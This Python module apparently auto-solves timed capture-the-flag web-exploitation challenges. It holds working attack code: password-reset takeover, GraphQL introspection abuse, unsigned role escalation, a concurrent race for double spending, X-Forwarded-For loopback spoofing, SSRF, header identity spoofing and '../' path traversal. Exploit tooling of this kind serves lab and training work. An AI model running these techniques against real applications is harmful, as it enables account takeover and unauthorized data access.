"""Dedicated speed readers for the saved Web D17--D29 timed rotations.

This module is deliberately separate from the release Web solver.  It accepts
only the exact saved Time Trial/Mastery contract, keeps every request on the
fresh target origin, and returns a proof only from a class-specific payoff
response after subtracting all control responses.  It contains no proof,
answer cache, Game Master client, or target address.

The saved Mastery rotation is cumulative: its leading targets are the known
D1--D5 structural readers and its final target is the day's family.  Those
leading readers are reused from the dedicated speed Web module; all bounded
HTTP, WebSocket, and concurrency machinery stays in ``speedrun.web_target``.
"""
from __future__ import annotations

import base64
import copy
import hashlib
import ipaddress
import json
import re
import time
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

from speedrun.solvers import web as _early
from speedrun.web_target import (
    Response, TargetClient, WebAnswers, barrier_calls, is_proof_value, prepare_tls_context,
    proof_tokens, solve_fresh_targets, target_identity,
)


LANE = "web"
PREFIX = "web-exploitation-day-"
IDENT = re.compile(r"^[A-Za-z_][A-Za-z0-9_.-]{0,63}$")
TOKEN = re.compile(r"^[A-Za-z0-9._~-]{3,256}$")
GRAPH_NAME = re.compile(r"^[_A-Za-z][_0-9A-Za-z]{0,63}$")
HEX64 = re.compile(r"^[0-9a-f]{64}$")


FAMILIES = {
    17: ("reset-expectations",
         "Forgot your password? This recovery flow forgot its manners. Walk the reset process sideways and wake up in somebody else's account."),
    18: ("resolver-revolt",
         "Discover the schema and reach a resolver whose field-level control is incomplete. Vary the protocol surface without changing the underlying authorization discipline."),
    19: ("trust-the-webhook",
         "The app believes every event it's told about. Tell it a convincing enough story and watch it act on your forged news."),
    20: ("serialized-offender",
         "Your session is just a blob of misplaced trust. Reshape the bytes, sign nothing, and see what the app suddenly believes about you."),
    21: ("double-spent",
         "One credit, two purchases. The ledger can't count what it can't see coming — race it and spend the same credit twice."),
    22: ("socket-to-me",
         "The chat upgraded to websockets and left its manners at the HTTP door. Ride the upgrade into an event stream that was never meant for you."),
    23: ("forwarded-misgivings",
         "The app believes whatever the proxy whispers in its ear. Whisper the right header and stroll down the protected path as an insider."),
    24: ("fail-open-friday",
         "The remote policy decoder is part of an access decision. A valid public decision is documented in the application; investigate what happens when that decision cannot be decoded."),
    25: ("if-a-breach-falls-in-a-log",
         "You broke in, and nobody wrote it down. Find the decisive moment the logs missed — if a breach falls in the forest, did it make a sound?"),
    26: ("trust-the-build",
         "The updater trusts its packages like old friends. Slip a tampered dependency into the build and watch it install your version of the truth."),
    27: ("internal-affairs",
         "Two service boundaries, one hallway. Use the public fetch to knock on the internal door, then borrow somebody else's records on the way out."),
    28: ("pass-the-identity",
         "Your identity is a hall pass — and this building accepts photocopies. Carry it across a delegated service boundary and cash it in where it doesn't belong."),
    29: ("queue-the-confusion",
         "Your job went into the queue with your name on it. Loosen the binding and watch somebody else's outcome come out wearing your stamp."),
}
SUPPORTED_DAYS = frozenset(FAMILIES)
TARGET_MODE = True
TARGET_REQUEST_BUDGET = 32


def prepare(_root=None):
    prepare_tls_context()


def _unique_pairs(pairs):
    out = {}
    canonical = set()
    for key, value in pairs:
        if not isinstance(key, str):
            raise ValueError("non-string JSON key")
        folded = re.sub(r"[^a-z0-9]+", "", key.lower())
        if key in out or folded in canonical:
            raise ValueError("duplicate or colliding JSON key")
        out[key] = value
        canonical.add(folded)
    return out


def _doc(response: Response):
    try:
        value = json.loads(response.body.decode("utf-8", "strict"),
                           object_pairs_hook=_unique_pairs,
                           parse_constant=lambda _v: (_ for _ in ()).throw(ValueError()))
    except (UnicodeError, ValueError, TypeError):
        return None
    return value if isinstance(value, dict) else None


def _tokens(*responses: Response):
    found = set()
    for response in responses:
        values = [response.body]
        values.extend(value.encode("utf-8", "ignore") for value in response.headers.values())
        for raw in values:
            found.update(proof_tokens(raw))
    return found


def _rejected(value):
    if isinstance(value, dict):
        for key, member in value.items():
            low = re.sub(r"[^a-z0-9]+", "_", key.lower()).strip("_")
            if low in {"error", "errors", "denied", "rejected"} and member not in (None, "", [], {}, False):
                return True
            if low in {"ok", "success", "accepted", "authorized", "allowed"} and member is False:
                return True
            if _rejected(member):
                return True
    elif isinstance(value, list):
        return any(_rejected(member) for member in value)
    return False


def _novel(response: Response, controls, *, effect: str | None = None,
           require_ok: bool = True, accepted_status: int | None = None):
    if ((accepted_status is None and not 200 <= response.status < 300)
            or (accepted_status is not None and response.status != accepted_status)):
        return None
    doc = _doc(response)
    if not isinstance(doc, dict) or _rejected(doc):
        return None
    if require_ok and doc.get("ok") is not True:
        return None
    if effect is not None and doc.get("effect") != effect:
        return None
    novel = _tokens(response) - _tokens(*controls)
    return next(iter(novel)) if len(novel) == 1 else None


def _route(client: TargetClient, value, *, query=False):
    if not isinstance(value, str) or len(value.encode("utf-8")) > 1024:
        return None
    try:
        parsed = urlsplit(value)
        if parsed.username is not None or parsed.password is not None or parsed.fragment:
            return None
        if parsed.scheme or parsed.netloc:
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
            origin = (parsed.scheme, (parsed.hostname or "").lower().rstrip("."), port)
            if origin != client.origin:
                return None
        if not parsed.path.startswith("/") or "\\" in value:
            return None
        if not query and parsed.query:
            return None
        if any(part == ".." for part in parsed.path.split("/")):
            return None
        return parsed.path + (("?" + parsed.query) if parsed.query else "")
    except (TypeError, ValueError):
        return None


def _clues(client):
    response = client.get("/api/clues")
    doc = _doc(response)
    return response, doc if response.status == 200 else None


def _late17(client, _attempt):
    clue_response, clues = _clues(client)
    if not isinstance(clues, dict):
        return None
    feature = _route(client, clues.get("feature_route"))
    secondary = _route(client, clues.get("secondary_route"))
    guide_route = _route(client, clues.get("recovery_guide_route"))
    if not feature or not secondary or not guide_route or len({feature, secondary, guide_route}) != 3:
        return None
    guide_response = client.get(guide_route)
    guide = _doc(guide_response)
    if not isinstance(guide, dict):
        return None
    request_route = _route(client, guide.get("request_route"))
    redeem_route = _route(client, guide.get("redeem_route"))
    account_param = guide.get("account_parameter")
    token_param = guide.get("token_parameter")
    accounts = guide.get("accounts")
    if (request_route != feature or redeem_route != secondary
            or not isinstance(account_param, str) or not IDENT.fullmatch(account_param)
            or not isinstance(token_param, str) or not IDENT.fullmatch(token_param)
            or account_param == token_param or not isinstance(accounts, list) or len(accounts) != 2):
        return None
    own = [row for row in accounts if isinstance(row, dict) and row.get("self_service") is True]
    victim = [row for row in accounts if isinstance(row, dict) and row.get("self_service") is False]
    if len(own) != 1 or len(victim) != 1 or "id" not in own[0] or "id" not in victim[0]:
        return None
    own_id, victim_id = own[0]["id"], victim[0]["id"]
    if isinstance(own_id, (dict, list, bool)) or isinstance(victim_id, (dict, list, bool)) or own_id == victim_id:
        return None
    issue = client.get(request_route + "?" + urlencode({account_param: str(own_id)}))
    issue_doc = _doc(issue)
    if (issue.status // 100 != 2 or not isinstance(issue_doc, dict) or issue_doc.get("ok") is not True
            or str(issue_doc.get(account_param)) != str(own_id)
            or not isinstance(issue_doc.get(token_param), str)
            or not TOKEN.fullmatch(issue_doc[token_param])
            or (issue_doc.get("redeem_route") is not None
                and _route(client, issue_doc.get("redeem_route")) != redeem_route)):
        return None
    payoff = client.get(redeem_route + "?" + urlencode(
        {account_param: str(victim_id), token_param: issue_doc[token_param]}))
    payoff_doc = _doc(payoff)
    if not isinstance(payoff_doc, dict) or str(payoff_doc.get(account_param)) != str(victim_id):
        return None
    return _novel(payoff, [clue_response, guide_response, issue],
                  effect="synthetic_account_recovery")


def _unwrap_type(value):
    required = False
    if isinstance(value, dict) and value.get("kind") == "NON_NULL":
        required = True
        value = value.get("ofType")
    return value if isinstance(value, dict) else None, required


def _late18(client, _attempt):
    clue_response, clues = _clues(client)
    if not isinstance(clues, dict):
        return None
    feature = _route(client, clues.get("feature_route"))
    reference = clues.get("protected_reference")
    note = " ".join(str(v) for v in clues.values() if isinstance(v, str)).lower()
    if not feature or isinstance(reference, (dict, list, bool)) or reference is None \
            or not ("resolver" in note or "field-level" in note):
        return None
    control = client.get(feature)
    introspection_query = (
        "query HuntressSchema{__schema{queryType{name}types{kind name fields{name "
        "args{name defaultValue type{kind name ofType{kind name}}}"
        "type{kind name ofType{kind name}}}}}}"
    )
    schema_response = client.post_json(feature, {"query": introspection_query, "variables": {}})
    schema_doc = _doc(schema_response)
    schema = ((schema_doc or {}).get("data") or {}).get("__schema") if isinstance(schema_doc, dict) else None
    if not isinstance(schema, dict) or not isinstance(schema.get("queryType"), dict) \
            or not isinstance(schema.get("types"), list):
        return None
    root_name = schema["queryType"].get("name")
    type_rows = [row for row in schema["types"] if isinstance(row, dict)]
    roots = [row for row in type_rows if row.get("kind") == "OBJECT" and row.get("name") == root_name]
    if len(roots) != 1 or not isinstance(roots[0].get("fields"), list):
        return None
    candidates = []
    for field in roots[0]["fields"]:
        if not isinstance(field, dict) or not GRAPH_NAME.fullmatch(str(field.get("name") or "")):
            continue
        args = field.get("args")
        result_type, _ = _unwrap_type(field.get("type"))
        if not isinstance(args, list) or len(args) != 1 or not isinstance(args[0], dict) \
                or not isinstance(result_type, dict) or result_type.get("kind") != "OBJECT":
            continue
        arg_type, required = _unwrap_type(args[0].get("type"))
        if (not required or not isinstance(arg_type, dict) or arg_type.get("kind") != "SCALAR"
                or not GRAPH_NAME.fullmatch(str(args[0].get("name") or ""))
                or not GRAPH_NAME.fullmatch(str(arg_type.get("name") or ""))
                or not GRAPH_NAME.fullmatch(str(result_type.get("name") or ""))):
            continue
        candidates.append((field["name"], args[0]["name"], arg_type["name"], result_type["name"]))
    if len(candidates) != 1:
        return None
    field_name, arg_name, scalar_name, result_name = candidates[0]
    results = [row for row in type_rows if row.get("kind") == "OBJECT" and row.get("name") == result_name]
    if len(results) != 1 or not isinstance(results[0].get("fields"), list):
        return None
    fields = []
    for row in results[0]["fields"]:
        if not isinstance(row, dict) or row.get("args") not in ([], None):
            continue
        ref, _ = _unwrap_type(row.get("type"))
        name = row.get("name")
        if isinstance(ref, dict) and ref.get("kind") in {"SCALAR", "ENUM"} \
                and isinstance(name, str) and GRAPH_NAME.fullmatch(name):
            fields.append(name)
    if not fields or len(fields) > 16:
        return None
    variable = reference
    if scalar_name == "Int":
        try:
            variable = int(str(reference))
        except ValueError:
            return None
    query = (f"query Huntress($ref:{scalar_name}!)"
             f"{{r1:{field_name}({arg_name}:$ref){{{' '.join(fields)}}}}}")
    payoff = client.post_json(feature, {"query": query, "variables": {"ref": variable}})
    payoff_doc = _doc(payoff)
    if not isinstance(payoff_doc, dict) or payoff_doc.get("errors") not in (None, []) \
            or not isinstance(payoff_doc.get("data"), dict) \
            or not isinstance(payoff_doc["data"].get("r1"), dict):
        return None
    novel = _tokens(payoff) - _tokens(clue_response, control, schema_response)
    return next(iter(novel)) if len(novel) == 1 else None


def _late19(client, _attempt):
    clue_response, clues = _clues(client)
    if not isinstance(clues, dict):
        return None
    feature = _route(client, clues.get("feature_route"))
    event = clues.get("event_type")
    owner = clues.get("owner_scope")
    if (not feature or not isinstance(event, str) or not re.fullmatch(r"[a-z][a-z0-9_.-]{2,80}", event)
            or not isinstance(owner, str) or not re.fullmatch(r"[A-Za-z][A-Za-z0-9_.-]{1,63}", owner)):
        return None
    control = client.get(feature)
    if control.status != 405 or (_doc(control) or {}).get("error") not in {
            "method_not_allowed", "post_required"}:
        return None
    payoff = client.post_json(feature, {"event": event, "owner": owner})
    return _novel(payoff, [clue_response, control], effect="forged_event_consumed")


def _late20(client, _attempt):
    clue_response, clues = _clues(client)
    if not isinstance(clues, dict):
        return None
    feature = _route(client, clues.get("feature_route"))
    fmt_route = _route(client, clues.get("state_format_route"))
    if not feature or not fmt_route or feature == fmt_route:
        return None
    fmt_response = client.get(fmt_route)
    fmt = _doc(fmt_response)
    if not isinstance(fmt, dict) or fmt.get("method") != "POST" \
            or _route(client, fmt.get("route")) != feature \
            or str(fmt.get("content_type") or "").lower() != "application/json" \
            or str(fmt.get("encoding") or "").lower() != "base64url" or fmt.get("signed") is not False \
            or not isinstance(fmt.get("body"), dict) or len(fmt["body"]) != 1 \
            or not isinstance(fmt.get("sample"), dict):
        return None
    state_field, description = next(iter(fmt["body"].items()))
    if not IDENT.fullmatch(str(state_field)) or "base64url" not in str(description).lower():
        return None
    sample = fmt["sample"]
    role_keys = [key for key, value in sample.items()
                 if isinstance(key, str) and key.lower() in {"role", "access", "privilege"}
                 and isinstance(value, str)]
    if len(role_keys) != 1 or len(sample) > 8:
        return None
    raised = dict(sample)
    raised[role_keys[0]] = "administrator"
    control = client.get(feature)
    direct = client.post_json(feature, raised)
    encoded = base64.urlsafe_b64encode(
        json.dumps(raised, separators=(",", ":"), ensure_ascii=False).encode("utf-8")
    ).decode("ascii").rstrip("=")
    payoff = client.post_json(feature, {state_field: encoded})
    return _novel(payoff, [clue_response, fmt_response, control, direct],
                  effect="serialized_role_trusted")


def _late21(client, _attempt):
    clue_response, clues = _clues(client)
    if not isinstance(clues, dict):
        return None
    feature = _route(client, clues.get("feature_route"))
    audit = _route(client, clues.get("secondary_route"))
    if not feature or not audit or feature == audit:
        return None
    feature_control = client.get(feature)
    audit_control = client.get(audit)
    if feature_control.status != 405 or (_doc(feature_control) or {}).get("error") != "post_required":
        return None
    audit_doc = _doc(audit_control)
    if audit_control.status != 403 or not isinstance(audit_doc, dict) \
            or audit_doc.get("error") != "credit_not_overspent" \
            or audit_doc.get("credits") != 1:
        return None
    # The solved production evidence needed a 20-client barrier burst.  Prepare
    # all origin-pinned connections before releasing any POST so connection/TLS
    # setup cannot collapse the race back into a narrow serial fan-out.
    forks = [client.fork() for _ in range(20)]
    try:
        raced = barrier_calls(
            [lambda fork=fork: fork.post_json(feature, {}) for fork in forks],
            preparations=[fork.preconnect for fork in forks],
            deadline=client.deadline)
    finally:
        for fork in forks:
            fork.close()
    successes = 0
    for response in raced:
        doc = _doc(response)
        if response.status // 100 == 2 and isinstance(doc, dict) \
                and doc.get("ok") is True and doc.get("effect") == "credit_redeemed":
            successes += 1
        elif response.status == 409 and isinstance(doc, dict) \
                and doc.get("error") == "credit_unavailable":
            continue
        else:
            return None
    if successes < 2:
        return None
    payoff = client.get(audit)
    return _novel(payoff, [clue_response, feature_control, audit_control, *raced],
                  effect="single_credit_spent_twice")


def _late22(client, _attempt):
    clue_response, clues = _clues(client)
    if not isinstance(clues, dict):
        return None
    feature = _route(client, clues.get("feature_route"))
    reference = clues.get("stream_reference")
    if not feature or isinstance(reference, (dict, list, bool)) or reference is None:
        return None
    control = client.get(feature)
    if control.status != 426 or (_doc(control) or {}).get("error") != "websocket_upgrade_required" \
            or control.headers.get("upgrade", "").lower() != "websocket":
        return None
    separator = "&" if "?" in feature else "?"
    payoff = client.websocket_text(feature + separator + urlencode({"stream": str(reference)}))
    return _novel(payoff, [clue_response, control], effect="unauthorized_event_stream",
                  accepted_status=101)


def _late23(client, _attempt):
    clue_response, clues = _clues(client)
    if not isinstance(clues, dict) or clues.get("deployment") != "trusted_reverse_proxy":
        return None
    feature = _route(client, clues.get("feature_route"))
    if not feature:
        return None
    control = client.get(feature)
    if control.status != 403 or (_doc(control) or {}).get("error") != "loopback_only":
        return None
    payoff = client.get(feature, headers={"X-Forwarded-For": "127.0.0.1"})
    doc = _doc(payoff)
    if not isinstance(doc, dict) or doc.get("evaluated_client") != "127.0.0.1":
        return None
    return _novel(payoff, [clue_response, control], effect="proxy_trust_admin_bypass")


def _canon_dict(value):
    if not isinstance(value, dict):
        return None
    out = {}
    for key, member in value.items():
        folded = re.sub(r"[^a-z0-9]+", "_", str(key).lower()).strip("_")
        if folded in out:
            return None
        out[folded] = member
    return out


def _late24(client, _attempt):
    clue_response, clues = _clues(client)
    if not isinstance(clues, dict):
        return None
    feature = _route(client, clues.get("feature_route"))
    fmt_route = _route(client, clues.get("policy_format_route"))
    expected = str(clues.get("expected_behavior") or "").lower()
    if not feature or not fmt_route or feature == fmt_route \
            or "deny" not in expected or "policy" not in expected \
            or not any(word in expected for word in ("unavailable", "failure", "failed", "error")):
        return None
    fmt_response = client.get(fmt_route)
    fmt = _doc(fmt_response)
    if not isinstance(fmt, dict):
        return None
    param, prefix, encoding = fmt.get("query_parameter"), fmt.get("prefix"), fmt.get("encoding")
    sample, decision = fmt.get("sample_encoded"), _canon_dict(fmt.get("sample_decision"))
    if (not isinstance(param, str) or not IDENT.fullmatch(param)
            or not isinstance(prefix, str) or not re.fullmatch(r"[A-Za-z0-9_.:-]{1,256}", prefix)
            or re.sub(r"[^a-z0-9]+", "", str(encoding).lower()) != "base64urlutf8json"
            or not isinstance(sample, str) or not re.fullmatch(r"[A-Za-z0-9_-]{2,4096}", sample)
            or not isinstance(decision, dict) or decision.get("allow") is not True
            or str(decision.get("scope") or "").lower() != "public"):
        return None
    try:
        decoded = sample + "=" * ((4 - len(sample) % 4) % 4)
        raw = base64.b64decode(decoded.encode("ascii"), altchars=b"-_", validate=True)
        sample_doc = _canon_dict(json.loads(raw.decode("utf-8"), object_pairs_hook=_unique_pairs))
    except (UnicodeError, ValueError):
        return None
    if sample_doc != decision:
        return None
    control = client.get(feature + "?" + urlencode({param: prefix + sample}))
    control_doc = _doc(control)
    if control.status // 100 != 2 or not isinstance(control_doc, dict) or control_doc.get("ok") is not True \
            or _tokens(control):
        return None
    payoff = client.get(feature + "?" + urlencode({param: prefix + "!"}))
    return _novel(payoff, [clue_response, fmt_response, control],
                  effect="exceptional_condition_fail_open")


def _late25(client, _attempt):
    clue_response, clues = _clues(client)
    if not isinstance(clues, dict):
        return None
    feature = _route(client, clues.get("feature_route"))
    audit = _route(client, clues.get("secondary_route"))
    if not feature or not audit or feature == audit:
        return None
    feature_control = client.get(feature)
    before_response = client.get(audit)
    before = _doc(before_response)
    if (feature_control.status != 405 or (_doc(feature_control) or {}).get("error") != "post_required"
            or not isinstance(before, dict) or before.get("ok") is not True
            or not isinstance(before.get("events"), list) or not isinstance(before.get("report"), dict)
            or before["report"].get("method") != "POST"
            or before["report"].get("fields") != ["export_id", "missing_event", "observed_event"]):
        return None
    action = client.post_json(feature, {})
    action_doc = _doc(action)
    if (action.status // 100 != 2 or not isinstance(action_doc, dict) or action_doc.get("ok") is not True
            or not isinstance(action_doc.get("operation"), str)
            or not isinstance(action_doc.get("export_id"), str)
            or not TOKEN.fullmatch(action_doc["export_id"])):
        return None
    after_response = client.get(audit)
    after = _doc(after_response)
    if not isinstance(after, dict) or after.get("ok") is not True or not isinstance(after.get("events"), list):
        return None
    before_rows = {json.dumps(row, sort_keys=True, separators=(",", ":"))
                   for row in before["events"] if isinstance(row, dict)}
    new_rows = [row for row in after["events"] if isinstance(row, dict)
                and json.dumps(row, sort_keys=True, separators=(",", ":")) not in before_rows]
    matching = [row for row in new_rows if row.get("export_id") == action_doc["export_id"]]
    if len(matching) != 1 or set(matching[0]) != {"export_id", "event"} \
            or not isinstance(matching[0].get("event"), str):
        return None
    report = {
        "export_id": action_doc["export_id"],
        "missing_event": action_doc["operation"],
        "observed_event": matching[0]["event"],
    }
    payoff = client.post_json(audit, report)
    return _novel(payoff, [clue_response, feature_control, before_response, action, after_response],
                  effect="decisive_security_event_missing")


def _late26(client, _attempt):
    clue_response, clues = _clues(client)
    if not isinstance(clues, dict):
        return None
    feature = _route(client, clues.get("feature_route"))
    feed_route = _route(client, clues.get("update_feed"))
    policy_route = _route(client, clues.get("update_policy"))
    if not feature or not feed_route or not policy_route or len({feature, feed_route, policy_route}) != 3:
        return None
    feed_response = client.get(feed_route)
    policy_response = client.get(policy_route)
    feed, policy = _doc(feed_response), _doc(policy_response)
    updates = feed.get("updates") if isinstance(feed, dict) else None
    hooks = policy.get("hooks") if isinstance(policy, dict) else None
    if not isinstance(updates, list) or len(updates) != 1 or not isinstance(updates[0], dict) \
            or not isinstance(hooks, dict) or len(hooks) < 2:
        return None
    update = updates[0]
    artifact = update.get("artifact")
    digest = update.get("artifact_sha256")
    signature = update.get("signature")
    if (not isinstance(artifact, dict) or not isinstance(digest, str) or not HEX64.fullmatch(digest)
            or not isinstance(signature, str) or not HEX64.fullmatch(signature)
            or hashlib.sha256(json.dumps(artifact, separators=(",", ":"), ensure_ascii=False)
                              .encode("utf-8")).hexdigest() != digest
            or not isinstance(artifact.get("hook"), str) or artifact["hook"] not in hooks):
        return None
    current_hook = hooks.get(artifact["hook"])
    integrity = str(policy.get("integrity_contract") or "").lower().replace("-", "")
    if not isinstance(current_hook, dict) \
            or str(current_hook.get("access") or "").lower() != "routine" \
            or "artifact" not in integrity or "sha256" not in integrity \
            or "verif" not in integrity:
        return None
    restricted = [name for name, row in hooks.items() if isinstance(name, str) and isinstance(row, dict)
                  and str(row.get("access") or "").lower() == "restricted"]
    if len(restricted) != 1 or restricted[0] == artifact["hook"]:
        return None
    control = client.get(feature)
    if control.status != 405 or (_doc(control) or {}).get("error") != "post_required":
        return None
    forged = copy.deepcopy(update)
    forged["artifact"]["hook"] = restricted[0]
    payoff = client.post_json(feature, forged)
    return _novel(payoff, [clue_response, feed_response, policy_response, control],
                  effect="unverified_update_activated")


def _internal_url(value):
    try:
        parsed = urlsplit(str(value))
        if parsed.scheme not in {"http", "https"} or not parsed.hostname \
                or parsed.username is not None or parsed.password is not None \
                or parsed.fragment or parsed.query:
            return None
        host = parsed.hostname.lower().rstrip(".")
        try:
            ip = ipaddress.ip_address(host)
            safe = ip.is_private or ip.is_loopback or ip.is_link_local
        except ValueError:
            safe = "." not in host or host.endswith((".internal", ".local", ".localhost"))
        return parsed if safe else None
    except (TypeError, ValueError):
        return None


def _late27(client, _attempt):
    clue_response, clues = _clues(client)
    if not isinstance(clues, dict):
        return None
    feature = _route(client, clues.get("feature_route"), query=True)
    topology_route = _route(client, clues.get("topology_route"))
    cases_route = _route(client, clues.get("case_directory_route"))
    current = clues.get("current_role")
    if not feature or not topology_route or not cases_route or not isinstance(current, str):
        return None
    feature_split = urlsplit(feature)
    feature_query = parse_qsl(feature_split.query, keep_blank_values=True)
    # Two coherent rotations are known.  The first advertises its empty outer
    # parameter in the clue route; the production Day-27 rotation advertises a
    # bare route and names ``target`` only in the 400 control response.  Do not
    # combine fields across the two shapes.
    advertised_shape = bool(feature_query)
    if advertised_shape and (len(feature_query) != 1 or feature_query[0][1] != ""
                             or not IDENT.fullmatch(feature_query[0][0])):
        return None
    topology_response = client.get(topology_route)
    cases_response = client.get(cases_route)
    topology, cases_doc = _doc(topology_response), _doc(cases_response)
    service = _internal_url(topology.get("case_service") if isinstance(topology, dict) else None)
    cases = cases_doc.get("cases") if isinstance(cases_doc, dict) else None
    if service is None or not isinstance(cases, list) or len(cases) != 2 \
            or any(not isinstance(row, dict) or not isinstance(row.get("owner"), str)
                   or not TOKEN.fullmatch(row["owner"]) for row in cases) \
            or not TOKEN.fullmatch(current):
        return None
    own = [row for row in cases if row["owner"] == current]
    others = [row for row in cases if row["owner"] != current]
    if len(own) != 1 or len(others) != 1:
        return None

    if advertised_shape:
        if any("id" in row for row in cases):
            return None
        identifiers = [row.get("case_id") for row in (own[0], others[0])]
        if any(not isinstance(value, str) or not TOKEN.fullmatch(value)
               for value in identifiers) or identifiers[0] == identifiers[1]:
            return None
        selector, expected_effect = "case_id", "non_owned_case_read"
        advertised_param = feature_query[0][0]
    else:
        if any("case_id" in row for row in cases):
            return None
        identifiers = [row.get("id") for row in (own[0], others[0])]
        if any(type(value) is not int or not 0 <= value <= (2 ** 63 - 1)
               for value in identifiers) or identifiers[0] == identifiers[1]:
            return None
        selector, expected_effect, advertised_param = "id", "ssrf_then_object_authorization", None

    control = client.get(feature)
    control_doc = _doc(control)
    if control.status != 400 or not isinstance(control_doc, dict):
        return None
    outer_param = control_doc.get("query_parameter")
    if not isinstance(outer_param, str) or not IDENT.fullmatch(outer_param):
        return None
    if advertised_shape:
        if outer_param != advertised_param:
            return None
    elif set(control_doc) != {"error", "query_parameter"} \
            or control_doc.get("error") != "target_required" or outer_param != "target":
        return None
    inner = urlunsplit((service.scheme, service.netloc, service.path,
                        urlencode({selector: identifiers[1]}), ""))
    exploit_path = feature_split.path + "?" + urlencode({outer_param: inner})
    payoff = client.get(exploit_path)
    return _novel(payoff, [clue_response, topology_response, cases_response, control],
                  effect=expected_effect)


def _late28(client, _attempt):
    clue_response, clues = _clues(client)
    if not isinstance(clues, dict):
        return None
    feature = _route(client, clues.get("feature_route"))
    directory_route = _route(client, clues.get("identity_directory_route"))
    current = clues.get("current_role")
    if not feature or not directory_route or not isinstance(current, str):
        return None
    directory_response = client.get(directory_route)
    directory = _doc(directory_response)
    if not isinstance(directory, dict) or directory.get("caller") != current:
        return None
    owner_keys = [key for key in ("records_owner", "restricted_owner") if key in directory]
    if len(owner_keys) != 1 or not isinstance(directory[owner_keys[0]], str) \
            or directory[owner_keys[0]] == current:
        return None
    control = client.get(feature)
    if control.status != 403 or (_doc(control) or {}).get("error") != "delegated_identity_rejected":
        return None
    vary = [item.strip().lower() for item in control.headers.get("vary", "").split(",") if item.strip()]
    if vary != ["x-delegated-user"]:
        return None
    payoff = client.get(feature, headers={"X-Delegated-User": directory[owner_keys[0]]})
    return _novel(payoff, [clue_response, directory_response, control],
                  effect="delegated_identity_trusted", require_ok=False)


def _late29(client, _attempt):
    clue_response, clues = _clues(client)
    if not isinstance(clues, dict):
        return None
    feature = _route(client, clues.get("feature_route"))
    audit = _route(client, clues.get("secondary_route"))
    directory_route = _route(client, clues.get("owner_directory_route"))
    current = clues.get("current_role")
    if not feature or not audit or not directory_route or not isinstance(current, str) \
            or len({feature, audit, directory_route}) != 3:
        return None
    directory_response = client.get(directory_route)
    directory = _doc(directory_response)
    if (not isinstance(directory, dict) or directory.get("caller") != current
            or not isinstance(directory.get("restricted_owner"), str)
            or directory["restricted_owner"] == current):
        return None
    feature_control = client.get(feature)
    audit_control = client.get(audit)
    feature_doc, audit_doc = _doc(feature_control), _doc(audit_control)
    if (feature_control.status != 405 or not isinstance(feature_doc, dict)
            or feature_doc.get("error") != "post_required"
            or feature_doc.get("request_fields") != ["owner"]
            or audit_control.status != 400 or not isinstance(audit_doc, dict)
            or audit_doc.get("error") != "job_id_required"
            or not isinstance(audit_doc.get("query_parameter"), str)
            or not IDENT.fullmatch(audit_doc["query_parameter"])):
        return None
    action = client.post_json(feature, {"owner": directory["restricted_owner"]})
    action_doc = _doc(action)
    if (action.status // 100 != 2 or not isinstance(action_doc, dict) or action_doc.get("ok") is not True
            or not isinstance(action_doc.get("id"), (str, int)) or isinstance(action_doc.get("id"), bool)
            or action_doc.get("queued_owner") != directory["restricted_owner"]):
        return None
    payoff = client.get(audit + "?" + urlencode({audit_doc["query_parameter"]: str(action_doc["id"])}))
    return _novel(payoff, [clue_response, directory_response, feature_control, audit_control, action],
                  effect="queue_owner_binding_bypassed")


LATE_READERS = {
    17: _late17, 18: _late18, 19: _late19, 20: _late20, 21: _late21,
    22: _late22, 23: _late23, 24: _late24, 25: _late25, 26: _late26,
    27: _late27, 28: _late28, 29: _late29,
}


def _legacy_lfi(client, _attempt):
    """Saved cumulative Masteries use D4's mounted objective shape."""
    root = client.get(client.root)
    location = root.headers.get("location")
    reader = _early._same_origin_path(location) if location else None
    if reader is None:
        links = _early._links(root)
        reader = links[0] if len(links) == 1 else None
    if reader is None:
        return None
    base = client.get(reader)
    params = []
    for link in _early._links(base):
        params.extend(key for key, _ in parse_qsl(urlsplit(link).query, keep_blank_values=True))
    if len(set(params)) != 1:
        return None
    parameter = params[0]
    payoffs = []
    for depth in (4, 6, 8, 3, 5, 2, 10):
        separator = "&" if "?" in reader else "?"
        path = "../" * depth + "run/huntress/objective.txt"
        payoffs.append(client.get(reader + separator + urlencode({parameter: path})))
        result = _early._one(payoffs, [root, base])
        if result is not None:
            return result
    return None


EARLY_READERS = {
    1: _early._backup,
    2: _early._idor,
    3: _early._sqli,
    4: _legacy_lfi,
    5: _early._route,
}


def _contract(attempt: dict, ctx: dict):
    day = ctx.get("day")
    mode = ctx.get("mode")
    if not isinstance(day, int) or isinstance(day, bool) or day not in FAMILIES \
            or mode not in {"time_trial", "mastery"}:
        return None
    if attempt.get("artifacts") or attempt.get("downloads") or attempt.get("download"):
        return None
    slug, prompt = FAMILIES[day]
    base = str(ctx.get("base") or "")
    challenge = str(ctx.get("challenge") or "")
    wanted = f"web-exploitation-day-{day:02d}-{slug}"
    if base != wanted or challenge != wanted + "/" + mode or attempt.get("mode") != mode \
            or attempt.get("prompt") != prompt:
        return None
    expected_count = 1 if mode == "time_trial" else (4 if day <= 21 else 5 if day <= 28 else 6)
    targets, answers, questions = attempt.get("targets"), attempt.get("answer_ids"), attempt.get("questions")
    if not isinstance(targets, list) or not isinstance(answers, list) or not isinstance(questions, list) \
            or len(targets) != expected_count or len(answers) != expected_count \
            or len(questions) != expected_count:
        return None
    rows = []
    identities = set()
    for index, (target, answer_id, question) in enumerate(zip(targets, answers, questions), 1):
        target_id = f"Target {index}"
        proof_id = f"proof-{index}"
        if (not isinstance(target, dict) or target.get("id") != target_id
                or not isinstance(target.get("url"), str) or answer_id != proof_id
                or not isinstance(question, dict) or question.get("id") != proof_id
                or question.get("artifact") != target_id
                or question.get("question") != f"Recover the proof from {target_id}."
                or question.get("normalization") != "trim"
                or question.get("answer_format") != {
                    "kind": "exact_text",
                    "syntax": "Submit the exact proof recovered from this target.",
                }
                or (mode == "time_trial" and "set" in question)
                or (mode == "mastery" and question.get("set") != index)):
            return None
        try:
            identity = target_identity(target["url"])
        except Exception:
            return None
        if identity in identities:
            return None
        identities.add(identity)
        rows.append((index, answer_id, target["url"]))
    return day, mode, rows


def contract_problem(attempt: dict, ctx: dict) -> str | None:
    """Return a structural saved-contract problem without touching a target."""
    return None if _contract(attempt, ctx) is not None else \
        "not the exact saved Web Day 17--29 timed target contract"


def solve_target(attempt: dict, ctx: dict) -> WebAnswers:
    """Derive every answer from the fresh target responses or omit it."""
    validated = _contract(attempt, ctx)
